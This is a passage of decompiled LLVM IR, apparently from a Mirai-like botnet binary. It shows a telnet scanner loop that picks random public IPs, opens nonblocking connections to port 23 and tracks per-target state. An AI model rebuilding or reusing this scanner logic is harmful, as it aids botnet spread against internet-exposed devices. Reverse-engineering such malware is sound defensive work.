  %v2_804d1b0 = or i32 %v2_804d02b, 9
  %v2_804d2a1 = or i32 %v2_804d02b, 11
  %v2_804d2e8 = or i32 %v2_804d02b, 10
  %v2_804dd59 = add i32 %v2_804d02b, 16
  br label %dec_label_pc_804d100

dec_label_pc_804d100:                             ; preds = %dec_label_pc_804d100, %dec_label_pc_804e0dc, %dec_label_pc_804d100.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804d100.preheader ], [ %stack_var_-624.0, %dec_label_pc_804d100 ], [ %stack_var_-624.1, %dec_label_pc_804e0dc ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804d100.preheader ], [ %stack_var_-628.0, %dec_label_pc_804d100 ], [ %stack_var_-628.1, %dec_label_pc_804e0dc ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804d0e258, label %dec_label_pc_804d10c, label %dec_label_pc_804d100

dec_label_pc_804d10c:                             ; preds = %dec_label_pc_804d100, %dec_label_pc_804e0dc
  %storemerge49 = phi i32 [ %v4_804e0dc, %dec_label_pc_804e0dc ], [ 0, %dec_label_pc_804d100 ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804e0dc ], [ %stack_var_-628.0, %dec_label_pc_804d100 ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804e0dc ], [ %stack_var_-624.0, %dec_label_pc_804d100 ]
  %v1_804d112 = mul i32 %storemerge49, 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v2_804d120 = mul i32 %storemerge49, 28
  %v2_804d122 = add i32 %v2_804d120, %v2_804d02b
  %v1_804d124 = add i32 %v2_804d122, 16
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v1_804d127 = inttoptr i32 %v1_804d124 to i32*
  %v2_804d127 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d127, i32* %eax.global-to-local, align 4
  %v1_804d129 = icmp eq i32 %v2_804d127, 0
  %v1_804d12b = icmp eq i1 %v1_804d129, false
  br i1 %v1_804d12b, label %dec_label_pc_804d15a, label %dec_label_pc_804d12d

dec_label_pc_804d12d:                             ; preds = %dec_label_pc_804d10c
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804d130 = load i32, i32* @esp, align 4
  %v1_804d130 = inttoptr i32 %v0_804d130 to i32*
  store i32 0, i32* %v1_804d130, align 4
  %v1_804d137 = inttoptr i32 %storemerge49 to i32*
  %v2_804d137 = call i32 @__GI_time(i32* %v1_804d137)
  store i32 %v2_804d137, i32* @esi, align 4
  %v0_804d141 = load i32, i32* @ebx, align 4
  %v1_804d143 = mul i32 %v0_804d141, 4
  store i32 %v1_804d143, i32* %edx.global-to-local, align 4
  %v2_804d151 = mul i32 %v0_804d141, 28
  %v2_804d153 = add i32 %v2_804d151, %v2_804d02b
  %v1_804d155 = add i32 %v2_804d153, 16
  store i32 %v1_804d155, i32* %eax.global-to-local, align 4
  %v2_804d158 = inttoptr i32 %v1_804d155 to i32*
  store i32 %v2_804d137, i32* %v2_804d158, align 4
  br label %dec_label_pc_804d15a

dec_label_pc_804d15a:                             ; preds = %dec_label_pc_804d10c, %dec_label_pc_804d12d
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d170 = add i32 %v2_804d170, %v2_804d120
  %v4_804d170 = inttoptr i32 %v3_804d170 to i8*
  %v5_804d170 = load i8, i8* %v4_804d170, align 4
  %v6_804d170 = zext i8 %v5_804d170 to i32
  store i32 %v6_804d170, i32* %eax.global-to-local, align 4
  store i32 %v6_804d170, i32* @edi, align 4
  %v1_804d191 = mul nuw nsw i32 %v6_804d170, 4
  %v2_804d191 = add nuw nsw i32 %v1_804d191, 134581952
  %v3_804d191 = inttoptr i32 %v2_804d191 to i32*
  %v4_804d191 = load i32, i32* %v3_804d191, align 4
  store i32 %v4_804d191, i32* %eax.global-to-local, align 4
  switch i8 %v5_804d170, label %dec_label_pc_804e0dc [
    i8 0, label %dec_label_pc_804d19a
    i8 1, label %dec_label_pc_804d546
    i8 2, label %dec_label_pc_804d7ac
    i8 3, label %dec_label_pc_804d8ec
    i8 4, label %dec_label_pc_804da3f
    i8 5, label %dec_label_pc_804db7f
    i8 6, label %dec_label_pc_804dcd2
    i8 7, label %dec_label_pc_804df6c
  ]

dec_label_pc_804d19a:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d1b0 = add i32 %v2_804d1b0, %v2_804d120
  %v4_804d1b0 = inttoptr i32 %v3_804d1b0 to i8*
  %v5_804d1b0 = load i8, i8* %v4_804d1b0, align 1
  %v10_804d1b5 = icmp eq i8 %v5_804d1b0, 1
  %v1_804d1b7 = icmp eq i1 %v10_804d1b5, false
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  br i1 %v1_804d1b7, label %dec_label_pc_804d266, label %dec_label_pc_804d1bd

dec_label_pc_804d1bd:                             ; preds = %dec_label_pc_804d19a
  %v1_804d1d5 = add i32 %v2_804d122, 24
  store i32 %v1_804d1d5, i32* %eax.global-to-local, align 4
  %v1_804d1d8 = inttoptr i32 %v1_804d1d5 to i32*
  %v2_804d1d8 = load i32, i32* %v1_804d1d8, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d1fb = inttoptr i32 %v2_804d122 to i32*
  store i32 0, i32* %v2_804d1fb, align 4
  %v0_804d1fd = load i32, i32* %eax.global-to-local, align 4
  %v1_804d1fd = add i32 %v0_804d1fd, 4
  store i32 %v1_804d1fd, i32* %eax.global-to-local, align 4
  %v0_804d200 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d200 = inttoptr i32 %v1_804d1fd to i32*
  store i32 %v0_804d200, i32* %v2_804d200, align 4
  %v0_804d202 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d202 = add i32 %v0_804d202, 4
  store i32 %v1_804d202, i32* %eax.global-to-local, align 4
  %v0_804d205 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d205 = inttoptr i32 %v1_804d202 to i32*
  store i32 %v0_804d205, i32* %v2_804d205, align 4
  %v0_804d207 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d207 = add i32 %v0_804d207, 4
  store i32 %v1_804d207, i32* %eax.global-to-local, align 4
  %v0_804d20a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d20a = inttoptr i32 %v1_804d207 to i32*
  store i32 %v0_804d20a, i32* %v2_804d20a, align 4
  %v0_804d20c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d20c = add i32 %v0_804d20c, 4
  store i32 %v1_804d20c, i32* %eax.global-to-local, align 4
  %v0_804d20f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d20f = inttoptr i32 %v1_804d20c to i32*
  store i32 %v0_804d20f, i32* %v2_804d20f, align 4
  %v0_804d211 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d211 = add i32 %v0_804d211, 4
  store i32 %v1_804d211, i32* %eax.global-to-local, align 4
  %v0_804d214 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d214 = inttoptr i32 %v1_804d211 to i32*
  store i32 %v0_804d214, i32* %v2_804d214, align 4
  %v0_804d216 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d216 = add i32 %v0_804d216, 4
  %v0_804d219 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d219 = inttoptr i32 %v1_804d216 to i32*
  store i32 %v0_804d219, i32* %v2_804d219, align 4
  store i32 %v1_804d1d5, i32* %edx.global-to-local, align 4
  store i32 %v2_804d1d8, i32* @eax, align 4
  store i32 %v2_804d1d8, i32* %v1_804d1d8, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804d23e = call i32 @GetRandomPublicIP(i32 %v6_804d170)
  %v0_804d248 = load i32, i32* @ebx, align 4
  %v1_804d24a = mul i32 %v0_804d248, 4
  store i32 %v1_804d24a, i32* %edx.global-to-local, align 4
  %v2_804d258 = mul i32 %v0_804d248, 28
  %v2_804d25a = add i32 %v2_804d258, %v2_804d02b
  %v1_804d25c = add i32 %v2_804d25a, 4
  store i32 %v1_804d25c, i32* %eax.global-to-local, align 4
  %v2_804d25f = inttoptr i32 %v1_804d25c to i32*
  store i32 %v1_804d23e, i32* %v2_804d25f, align 4
  br label %dec_label_pc_804d395

dec_label_pc_804d266:                             ; preds = %dec_label_pc_804d19a
  %v5_804d27c = load i8, i8* %v4_804d1b0, align 1
  %v6_804d27c = zext i8 %v5_804d27c to i32
  store i32 %v6_804d27c, i32* %eax.global-to-local, align 4
  %v4_804d281 = icmp eq i8 %v5_804d27c, 0
  %v1_804d283 = icmp eq i1 %v4_804d281, false
  br i1 %v1_804d283, label %dec_label_pc_804d395, label %dec_label_pc_804d289

dec_label_pc_804d289:                             ; preds = %dec_label_pc_804d266
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d2a1 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804d2a1 = inttoptr i32 %v3_804d2a1 to i8*
  %v5_804d2a1 = load i8, i8* %v4_804d2a1, align 1
  %v2_804d2a8 = add i8 %v5_804d2a1, 1
  store i8 %v2_804d2a8, i8* %v4_804d2a1, align 1
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d2e8 = add i32 %v2_804d2e8, %v2_804d120
  %v4_804d2e8 = inttoptr i32 %v3_804d2e8 to i8*
  %v5_804d2e8 = load i8, i8* %v4_804d2e8, align 2
  %v2_804d2ef = add i8 %v5_804d2e8, 1
  store i8 %v2_804d2ef, i8* %v4_804d2e8, align 2
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804d32d = load i8, i8* %v4_804d2a1, align 1
  %v10_804d332 = icmp eq i8 %v5_804d32d, 4
  %v1_804d334 = icmp eq i1 %v10_804d332, false
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  br i1 %v1_804d334, label %dec_label_pc_804d356, label %dec_label_pc_804d336

dec_label_pc_804d336:                             ; preds = %dec_label_pc_804d289
  store i8 1, i8* %v4_804d1b0, align 1
  br label %dec_label_pc_804e0dc

dec_label_pc_804d356:                             ; preds = %dec_label_pc_804d289
  %v5_804d36c = load i8, i8* %v4_804d2e8, align 2
  %v6_804d36c = zext i8 %v5_804d36c to i32
  store i32 %v6_804d36c, i32* %eax.global-to-local, align 4
  %v10_804d371 = icmp eq i8 %v5_804d36c, 4
  %v1_804d373 = icmp eq i1 %v10_804d371, false
  br i1 %v1_804d373, label %dec_label_pc_804d395, label %dec_label_pc_804d375

dec_label_pc_804d375:                             ; preds = %dec_label_pc_804d356
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d1b0, align 1
  br label %dec_label_pc_804e0dc

dec_label_pc_804d395:                             ; preds = %dec_label_pc_804d356, %dec_label_pc_804d266, %dec_label_pc_804d1bd
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804d39e = load i32, i32* @esp, align 4
  %v1_804d39e = inttoptr i32 %v0_804d39e to i32*
  store i32 23, i32* %v1_804d39e, align 4
  %v0_804d3a5 = load i32, i32* %stack_var_-604, align 4
  %v1_804d3a5 = trunc i32 %v0_804d3a5 to i16
  %v2_804d3a5 = call i32 @htons(i16 %v1_804d3a5)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804d3e2 = add i32 %v2_804d122, 4
  store i32 %v1_804d3e2, i32* %eax.global-to-local, align 4
  %v1_804d3e5 = inttoptr i32 %v1_804d3e2 to i32*
  %v2_804d3e5 = load i32, i32* %v1_804d3e5, align 4
  store i32 %v2_804d3e5, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804d3f0 = load i32, i32* @esp, align 4
  %v1_804d3f0 = add i32 %v0_804d3f0, 8
  %v2_804d3f0 = inttoptr i32 %v1_804d3f0 to i32*
  store i32 0, i32* %v2_804d3f0, align 4
  %v0_804d3f8 = load i32, i32* @esp, align 4
  %v1_804d3f8 = add i32 %v0_804d3f8, 4
  %v2_804d3f8 = inttoptr i32 %v1_804d3f8 to i32*
  store i32 1, i32* %v2_804d3f8, align 4
  %v0_804d400 = load i32, i32* @esp, align 4
  %v1_804d400 = inttoptr i32 %v0_804d400 to i32*
  store i32 2, i32* %v1_804d400, align 4
  %v2_804d407 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804d3a5, 65536
  %v3_804d407 = sdiv i32 %sext, 65536
  %v4_804d407 = call i32 @socket(i32 %v3_804d407, i32 %v2_804d3e5, i32 %v2_804d407)
  store i32 %v4_804d407, i32* @esi, align 4
  %v0_804d411 = load i32, i32* @ebx, align 4
  %v2_804d421 = mul i32 %v0_804d411, 28
  %v3_804d423 = add i32 %v2_804d421, %v2_804d02b
  %v4_804d423 = inttoptr i32 %v3_804d423 to i32*
  store i32 %v4_804d407, i32* %v4_804d423, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d43c = inttoptr i32 %v2_804d122 to i32*
  %v4_804d43c = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d43c, i32* %eax.global-to-local, align 4
  %v10_804d43f = icmp eq i32 %v4_804d43c, -1
  br i1 %v10_804d43f, label %dec_label_pc_804e0dc, label %dec_label_pc_804d448

dec_label_pc_804d448:                             ; preds = %dec_label_pc_804d395
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d45e = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d45e, i32* %eax.global-to-local, align 4
  %v0_804d461 = load i32, i32* @esp, align 4
  %v1_804d461 = add i32 %v0_804d461, 8
  %v2_804d461 = inttoptr i32 %v1_804d461 to i32*
  store i32 0, i32* %v2_804d461, align 4
  %v0_804d469 = load i32, i32* @esp, align 4
  %v1_804d469 = add i32 %v0_804d469, 4
  %v2_804d469 = inttoptr i32 %v1_804d469 to i32*
  store i32 3, i32* %v2_804d469, align 4
  %v0_804d471 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d471 = load i32, i32* @esp, align 4
  %v2_804d471 = inttoptr i32 %v1_804d471 to i32*
  store i32 %v0_804d471, i32* %v2_804d471, align 4
  %v1_804d474 = load i32, i32* %stack_var_-596, align 4
  %v3_804d474 = call i32 @__libc_fcntl(i32 %v2_804d3e5, i32 %v1_804d474, i32 0)
  %v1_804d47b = or i32 %v3_804d474, 2048
  store i32 %v1_804d47b, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d497 = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d497, i32* %eax.global-to-local, align 4
  %v1_804d49a = load i32, i32* @esp, align 4
  %v2_804d49a = add i32 %v1_804d49a, 8
  %v3_804d49a = inttoptr i32 %v2_804d49a to i32*
  store i32 %v1_804d47b, i32* %v3_804d49a, align 4
  %v0_804d49e = load i32, i32* @esp, align 4
  %v1_804d49e = add i32 %v0_804d49e, 4
  %v2_804d49e = inttoptr i32 %v1_804d49e to i32*
  store i32 4, i32* %v2_804d49e, align 4
  %v0_804d4a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4a6 = load i32, i32* @esp, align 4
  %v2_804d4a6 = inttoptr i32 %v1_804d4a6 to i32*
  store i32 %v0_804d4a6, i32* %v2_804d4a6, align 4
  %v1_804d4a9 = load i32, i32* %stack_var_-596, align 4
  %v3_804d4a9 = call i32 @__libc_fcntl(i32 %v2_804d3e5, i32 %v1_804d4a9, i32 0)
  store i32 %v2_804cfb4, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d4ca = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d4ca, i32* %eax.global-to-local, align 4
  %v0_804d4cd = load i32, i32* @esp, align 4
  %v1_804d4cd = add i32 %v0_804d4cd, 8
  %v2_804d4cd = inttoptr i32 %v1_804d4cd to i32*
  store i32 16, i32* %v2_804d4cd, align 4
  %v1_804d4d5 = load i32, i32* @esp, align 4
  %v2_804d4d5 = add i32 %v1_804d4d5, 4
  %v3_804d4d5 = inttoptr i32 %v2_804d4d5 to i32*
  store i32 %v2_804cfb4, i32* %v3_804d4d5, align 4
  %v0_804d4d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4d9 = load i32, i32* @esp, align 4
  %v2_804d4d9 = inttoptr i32 %v1_804d4d9 to i32*
  store i32 %v0_804d4d9, i32* %v2_804d4d9, align 4
  %v1_804d4dc = load i32, i32* %stack_var_-596, align 4
  %v3_804d4dc = call i32 @__libc_connect(i32 %v2_804d3e5, i32 %v1_804d4dc, i32 0)
  store i32 %v3_804d4dc, i32* %eax.global-to-local, align 4
  %v10_804d4e1 = icmp eq i32 %v3_804d4dc, -1
  %v1_804d4e4 = icmp eq i1 %v10_804d4e1, false
  br i1 %v1_804d4e4, label %dec_label_pc_804d518, label %dec_label_pc_804d4e6

dec_label_pc_804d4e6:                             ; preds = %dec_label_pc_804d448
  %v1_804d4e6 = call i32 @__errno_location(i32 %v2_804d3e5)
  store i32 %v1_804d4e6, i32* %eax.global-to-local, align 4
  %v1_804d4eb = inttoptr i32 %v1_804d4e6 to i32*
  %v2_804d4eb = load i32, i32* %v1_804d4eb, align 4
  store i32 %v2_804d4eb, i32* %eax.global-to-local, align 4
  %v9_804d4ed = icmp eq i32 %v2_804d4eb, 115
  br i1 %v9_804d4ed, label %dec_label_pc_804d518, label %dec_label_pc_804d4f2

dec_label_pc_804d4f2:                             ; preds = %dec_label_pc_804d4e6
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d50b = load i32, i32* @esp, align 4
  %v2_804d50b = inttoptr i32 %v1_804d50b to i32*
  store i32 %v2_804d122, i32* %v2_804d50b, align 4
  %v1_804d50e = call i32 @reset_telstate(i32 %v2_804d3e5)
  store i32 %v1_804d50e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d518:                             ; preds = %dec_label_pc_804d4e6, %dec_label_pc_804d448
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d531 = load i32, i32* @esp, align 4
  %v1_804d531 = add i32 %v0_804d531, 4
  %v2_804d531 = inttoptr i32 %v1_804d531 to i32*
  store i32 1, i32* %v2_804d531, align 4
  %v0_804d539 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d539 = load i32, i32* @esp, align 4
  %v2_804d539 = inttoptr i32 %v1_804d539 to i32*
  store i32 %v0_804d539, i32* %v2_804d539, align 4
  %v1_804d53c = load i32, i32* %stack_var_-596, align 4
  %v2_804d53c = inttoptr i32 %v2_804d3e5 to i32*
  %v3_804d53c = call i32 @advance_state(i32* %v2_804d53c, i32 %v1_804d53c)
  store i32 %v3_804d53c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d546:                             ; preds = %dec_label_pc_804d15a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d550, i32* @edi, align 4
  %v5_804d557 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d575 = inttoptr i32 %v2_804d122 to i32*
  %v4_804d575 = load i32, i32* %v3_804d575, align 4
  %v2_804d57a = udiv i32 %v4_804d575, 32
  store i32 %v2_804d57a, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d593 = load i32, i32* %v3_804d575, align 4
  %v1_804d596 = urem i32 %v4_804d593, 32
  store i32 %v1_804d596, i32* %eax.global-to-local, align 4
  %v0_804d599 = load i32, i32* @ebp, align 4
  %v2_804d599 = mul nuw nsw i32 %v2_804d57a, 4
  %v3_804d599 = add nsw i32 %v2_804d599, -312
  %v4_804d599 = add i32 %v3_804d599, %v0_804d599
  %v5_804d599 = inttoptr i32 %v4_804d599 to i32*
  %v6_804d599 = load i32, i32* %v5_804d599, align 4
  %v9_804d599 = shl i32 1, %v1_804d596
  %v12_804d599 = or i32 %v6_804d599, %v9_804d599
  store i32 %v12_804d599, i32* %v5_804d599, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d5ca = load i32, i32* %v3_804d575, align 4
  %v1_804d5cd = add i32 %v4_804d5ca, 1
  store i32 %v1_804d5cd, i32* %edx.global-to-local, align 4
  %v1_804d5d6 = load i32, i32* @esp, align 4
  %v2_804d5d6 = add i32 %v1_804d5d6, 16
  %v3_804d5d6 = inttoptr i32 %v2_804d5d6 to i32*
  store i32 %v2_804d5d0, i32* %v3_804d5d6, align 4
  %v0_804d5da = load i32, i32* @esp, align 4
  %v1_804d5da = add i32 %v0_804d5da, 12
  %v2_804d5da = inttoptr i32 %v1_804d5da to i32*
  store i32 0, i32* %v2_804d5da, align 4
  store i32 %v2_804d550, i32* %eax.global-to-local, align 4
  %v1_804d5e8 = load i32, i32* @esp, align 4
  %v2_804d5e8 = add i32 %v1_804d5e8, 8
  %v3_804d5e8 = inttoptr i32 %v2_804d5e8 to i32*
  store i32 %v2_804d550, i32* %v3_804d5e8, align 4
  %v0_804d5ec = load i32, i32* @esp, align 4
  %v1_804d5ec = add i32 %v0_804d5ec, 4
  %v2_804d5ec = inttoptr i32 %v1_804d5ec to i32*
  store i32 0, i32* %v2_804d5ec, align 4
  %v0_804d5f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d5f4 = load i32, i32* @esp, align 4
  %v2_804d5f4 = inttoptr i32 %v1_804d5f4 to i32*
  store i32 %v0_804d5f4, i32* %v2_804d5f4, align 4
  %v0_804d5f7 = load i32, i32* %stack_var_-324, align 4
  %v2_804d5f7 = load i32, i32* %stack_var_-316, align 4
  %v5_804d5f7 = call i32 @__libc_select(i32 %v0_804d5f7, i32 %arg1, i32 %v2_804d5f7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d5f7, i32* %eax.global-to-local, align 4
  %v12_804d5ff = icmp eq i32 %v5_804d5f7, 1
  %v1_804d603 = icmp eq i1 %v12_804d5ff, false
  br i1 %v1_804d603, label %dec_label_pc_804d726, label %dec_label_pc_804d609

dec_label_pc_804d609:                             ; preds = %dec_label_pc_804d546
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d633 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d633, i32* %edx.global-to-local, align 4
  %v1_804d63c = load i32, i32* @esp, align 4
  %v2_804d63c = add i32 %v1_804d63c, 16
  %v3_804d63c = inttoptr i32 %v2_804d63c to i32*
  store i32 %v2_804d636, i32* %v3_804d63c, align 4
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  %v1_804d646 = load i32, i32* @esp, align 4
  %v2_804d646 = add i32 %v1_804d646, 12
  %v3_804d646 = inttoptr i32 %v2_804d646 to i32*
  store i32 %v2_804d640, i32* %v3_804d646, align 4
  %v0_804d64a = load i32, i32* @esp, align 4
  %v1_804d64a = add i32 %v0_804d64a, 8
  %v2_804d64a = inttoptr i32 %v1_804d64a to i32*
  store i32 4, i32* %v2_804d64a, align 4
  %v0_804d652 = load i32, i32* @esp, align 4
  %v1_804d652 = add i32 %v0_804d652, 4
  %v2_804d652 = inttoptr i32 %v1_804d652 to i32*
  store i32 1, i32* %v2_804d652, align 4
  %v0_804d65a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d65a = load i32, i32* @esp, align 4
  %v2_804d65a = inttoptr i32 %v1_804d65a to i32*
  store i32 %v0_804d65a, i32* %v2_804d65a, align 4
  %v0_804d65d = load i32, i32* %stack_var_-332, align 4
  %v1_804d65d = load i32, i32* %stack_var_-328, align 4
  %v2_804d65d = load i32, i32* %stack_var_-324, align 4
  %v4_804d65d = load i32, i32* %stack_var_-316, align 4
  %v5_804d65d = call i32 @getsockopt(i32 %v0_804d65d, i32 %v1_804d65d, i32 %v2_804d65d, i32 %arg1, i32 %v4_804d65d)
  %v3_804d662 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804d662, i32* %eax.global-to-local, align 4
  %v1_804d668 = icmp eq i32 %v3_804d662, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d668, label %dec_label_pc_804d692, label %dec_label_pc_804d66c

dec_label_pc_804d66c:                             ; preds = %dec_label_pc_804d609
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d685 = load i32, i32* @esp, align 4
  %v2_804d685 = inttoptr i32 %v1_804d685 to i32*
  store i32 %v2_804d122, i32* %v2_804d685, align 4
  %v0_804d688 = load i32, i32* %stack_var_-332, align 4
  %v1_804d688 = call i32 @reset_telstate(i32 %v0_804d688)
  store i32 %v1_804d688, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d692:                             ; preds = %dec_label_pc_804d609
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d6a8 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d6a8, i32* %eax.global-to-local, align 4
  %v0_804d6ab = load i32, i32* @esp, align 4
  %v1_804d6ab = add i32 %v0_804d6ab, 8
  %v2_804d6ab = inttoptr i32 %v1_804d6ab to i32*
  store i32 0, i32* %v2_804d6ab, align 4
  %v0_804d6b3 = load i32, i32* @esp, align 4
  %v1_804d6b3 = add i32 %v0_804d6b3, 4
  %v2_804d6b3 = inttoptr i32 %v1_804d6b3 to i32*
  store i32 3, i32* %v2_804d6b3, align 4
  %v0_804d6bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804d6bb = load i32, i32* @esp, align 4
  %v2_804d6bb = inttoptr i32 %v1_804d6bb to i32*
  store i32 %v0_804d6bb, i32* %v2_804d6bb, align 4
  %v0_804d6be = load i32, i32* %stack_var_-332, align 4
  %v1_804d6be = load i32, i32* %stack_var_-328, align 4
  %v2_804d6be = load i32, i32* %stack_var_-324, align 4
  %v3_804d6be = call i32 @__libc_fcntl(i32 %v0_804d6be, i32 %v1_804d6be, i32 %v2_804d6be)
  %v1_804d6c5 = and i32 %v3_804d6be, -2049
  store i32 %v1_804d6c5, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d6e1 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d6e1, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = load i32, i32* @esp, align 4
  %v2_804d6e4 = add i32 %v1_804d6e4, 8
  %v3_804d6e4 = inttoptr i32 %v2_804d6e4 to i32*
  store i32 %v1_804d6c5, i32* %v3_804d6e4, align 4
  %v0_804d6e8 = load i32, i32* @esp, align 4
  %v1_804d6e8 = add i32 %v0_804d6e8, 4
  %v2_804d6e8 = inttoptr i32 %v1_804d6e8 to i32*
  store i32 4, i32* %v2_804d6e8, align 4
  %v0_804d6f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d6f0 = load i32, i32* @esp, align 4
  %v2_804d6f0 = inttoptr i32 %v1_804d6f0 to i32*
  store i32 %v0_804d6f0, i32* %v2_804d6f0, align 4
  %v0_804d6f3 = load i32, i32* %stack_var_-332, align 4
  %v1_804d6f3 = load i32, i32* %stack_var_-328, align 4
  %v2_804d6f3 = load i32, i32* %stack_var_-324, align 4
  %v3_804d6f3 = call i32 @__libc_fcntl(i32 %v0_804d6f3, i32 %v1_804d6f3, i32 %v2_804d6f3)
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d711 = load i32, i32* @esp, align 4
  %v1_804d711 = add i32 %v0_804d711, 4
  %v2_804d711 = inttoptr i32 %v1_804d711 to i32*
  store i32 2, i32* %v2_804d711, align 4
  %v0_804d719 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d719 = load i32, i32* @esp, align 4
  %v2_804d719 = inttoptr i32 %v1_804d719 to i32*
  store i32 %v0_804d719, i32* %v2_804d719, align 4
  %v0_804d71c = load i32, i32* %stack_var_-332, align 4
  %v1_804d71c = load i32, i32* %stack_var_-328, align 4
  %v2_804d71c = inttoptr i32 %v0_804d71c to i32*
  %v3_804d71c = call i32 @advance_state(i32* %v2_804d71c, i32 %v1_804d71c)
  store i32 %v3_804d71c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d726:                             ; preds = %dec_label_pc_804d546
  %v13_804d726 = icmp eq i32 %v5_804d5f7, -1
  %v1_804d72a = icmp eq i1 %v13_804d726, false
